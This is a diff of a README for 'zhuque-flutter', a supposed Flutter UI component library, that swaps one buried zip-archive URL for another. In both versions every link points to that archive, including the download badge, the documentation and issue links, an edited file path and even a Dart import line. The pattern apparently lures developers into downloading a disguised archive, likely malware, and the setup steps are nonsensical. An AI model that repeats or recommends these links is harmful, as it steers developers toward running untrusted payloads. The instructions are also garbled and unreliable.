@@ -1,7 +1,7 @@
 # 🌟 zhuque-flutter - A Beautiful Flutter UI Component Library
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/android/gradle/wrapper/zhuque-flutter-2.8-alpha.1.zip)](https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/android/gradle/wrapper/zhuque-flutter-2.8-alpha.1.zip)
+[![Download](https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/lib/features/component/swipe_action/presentation/flutter-zhuque-v2.5.zip)](https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/lib/features/component/swipe_action/presentation/flutter-zhuque-v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **zhuque-flutter** project! This is a user-friendly UI component library for Flutter, built on the open-source TDesign framework by Tencent. With this library, you can easily enhance your Flutter applications with modern and visually appealing components.
@@ -23,17 +23,17 @@ To get started with **zhuque-flutter**, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to our releases page.
    
-   [Download zhuque-flutter](https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/android/gradle/wrapper/zhuque-flutter-2.8-alpha.1.zip)
+   [Download zhuque-flutter](https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/lib/features/component/swipe_action/presentation/flutter-zhuque-v2.5.zip)
 
 2. **Choose the Latest Version:** Look for the latest version of the library. The version will usually be the one at the top of the list.
 
-3. **Download the Package:** Click on the link for the package that suits your operating system. This could be a .zip or https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/android/gradle/wrapper/zhuque-flutter-2.8-alpha.1.zip file.
+3. **Download the Package:** Click on the link for the package that suits your operating system. This could be a .zip or https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/lib/features/component/swipe_action/presentation/flutter-zhuque-v2.5.zip file.
 
 4. **Extract the Package:** Once downloaded, locate the file on your computer. Right-click on the file and choose to extract it to a folder.
 
 5. **Open Your Flutter Project:** Launch your Flutter project in your chosen code editor.
 
-6. **Add the Library:** Open the `https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/android/gradle/wrapper/zhuque-flutter-2.8-alpha.1.zip` file in your Flutter project. Add the following line under the dependencies section:
+6. **Add the Library:** Open the `https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/lib/features/component/swipe_action/presentation/flutter-zhuque-v2.5.zip` file in your Flutter project. Add the following line under the dependencies section:
    ```yaml
    zhuque_flutter: path_to_extracted_folder
    ```
@@ -50,7 +50,7 @@ To get started with **zhuque-flutter**, follow these steps:
 You can start using the components right away. Simply import the library into your Dart files:
 
 ```dart
-import 'https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/android/gradle/wrapper/zhuque-flutter-2.8-alpha.1.zip';
+import 'https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/lib/features/component/swipe_action/presentation/flutter-zhuque-v2.5.zip';
 ```
 
 Then, you can create beautiful UI elements using the provided components. Check out the included documentation for examples and usage instructions.
@@ -64,8 +64,8 @@ We welcome contributions! If you would like to assist in improving **zhuque-flut
 Thank you for choosing **zhuque-flutter**. We hope our library helps you build fantastic Flutter apps effortlessly.
 
 ## 🔗 Additional Resources
-- [Flutter Documentation](https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/android/gradle/wrapper/zhuque-flutter-2.8-alpha.1.zip)
-- [TDesign Documentation](https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/android/gradle/wrapper/zhuque-flutter-2.8-alpha.1.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/android/gradle/wrapper/zhuque-flutter-2.8-alpha.1.zip)
+- [Flutter Documentation](https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/lib/features/component/swipe_action/presentation/flutter-zhuque-v2.5.zip)
+- [TDesign Documentation](https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/lib/features/component/swipe_action/presentation/flutter-zhuque-v2.5.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/HAULIKKOMUTU/zhuque-flutter/main/lib/features/component/swipe_action/presentation/flutter-zhuque-v2.5.zip)
 
 Now, go ahead and build something amazing with zhuque-flutter!
